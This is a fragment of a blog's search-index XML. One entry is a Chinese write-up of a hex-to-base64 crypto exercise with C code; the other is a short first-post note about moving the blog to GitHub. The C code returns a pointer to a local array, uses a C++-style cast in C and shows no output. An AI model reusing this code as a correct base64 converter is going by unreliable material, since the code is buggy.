    <content type="text"><![CDATA[实验一：Convert hex to base64 （编程将十六进制的字符串转换成base64编码）：编程将如下的十六进制字符串:49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d 转换成如下的base64编码的字符串:SSdtIGtpbGxpbmcgeW91ciBicmFpbiBsaWtlIGEgcG9pc29ub3VzIG11c2hyb29t ###实验原理或者解题思路方法： 首先将十六进制数转换为二进制，然后将二进制数每六位一组，转换成十进制数，将十进制数利用ASCII分别与base64的字符对应，最后输出结果 实现代码如下：#include&lt;stdio.h&gt; char *ssd(char s[],int l,int y);//将十六进制 转换为二进制 void ttob(char b[],int v);//二进制转换为base64并输出 int main() { char a[]={&quot;49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d&quot;}; int size=sizeof(a)-1;//判断多少位十六进制数 char *m; m=ssd(a,size,1); ttob(m,4*size); } char *ssd(char s[],int l,int y)//将十六进制 转换为二进制 { int e; char aaa[100]; //将十六进制数利用SCII分别与十进制整数对应并存储到数组中 for(e=0;e&lt;l;e++) { if(s[e]&lt;=&apos;f&apos;&amp;&amp;s[e]&gt;=&apos;a&apos;) aaa[e]=int(s[e])-87; else aaa[e]=int(s[e])-48; } char ss[3][1000]; //十六进制的组合从0到e char as[]={0,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,0,1,0,0,0,1,0,1,0,1,1,0,0,1,1,1,1,0,0,0,1,0,0,1,1,0,1,0,1,0,1,1,1,1,0,0,1,1,0,1,1,1,1,0,1,1,1,1}; int x=0,v=0,k; //将十进制数转换为二进制存入数组中 do{ k=0; while(k&lt;4) { int c; c=4*aaa[x]+k; ss[y][v++]=as[c]; k++; } x++; }while(x&lt;l); return ss[y]; } void ttob(char b[],int v)//二进制转换为base64并输出 { int i=0,n=0,q=0; char s[100]; //将二进制每六位一组转换成十进制数 while(1){ n=2*n+b[i++]; if(i%6==0||i==v) { s[q++]=n; n=0; if(i==v) break; } } printf(&quot;十六进制数转换成base64为：\n&quot;); //将十进制数利用ASCII分别与base64的字符对应，然后输出 for(i=0;i&lt;q;i++) { if(s[i]&lt;=25&amp;&amp;s[i]&gt;=0) printf(&quot;%c&quot;,s[i]+65); else if(s[i]&gt;=26&amp;&amp;s[i]&lt;=51) printf(&quot;%c&quot;,s[i]+71); else if(s[i]&gt;=52&amp;&amp;s[i]&lt;=61) printf(&quot;%c&quot;,s[i]-4); else if(s[i]==62) printf(&quot;%c&quot;,s[i]-19); else printf(&quot;%c&quot;,s[i]-16); } } 运行结果略]]></content>
      <tags>
        <tag>cryptology</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[My first Post]]></title>
    <url>%2F2019%2F03%2F29%2FMy-first-Post%2F</url>
    <content type="text"><![CDATA[这是我的第一篇文章 &emsp; 由于之前一直在使用搭建在远程服务器上的wordpress做的博客，然后有一天我的服务器突然被我弄崩溃了，我之前写的没有备份的博客就全都没了，所以我现在在github上面重新搭建一个博客。&emsp; 这个博客要是为了把我自己做过的东西进行总结以及上传，供大家参考以及方便我的复习。]]></content>
      <tags>
        <tag>mood</tag>
      </tags>
  </entry>
</search>
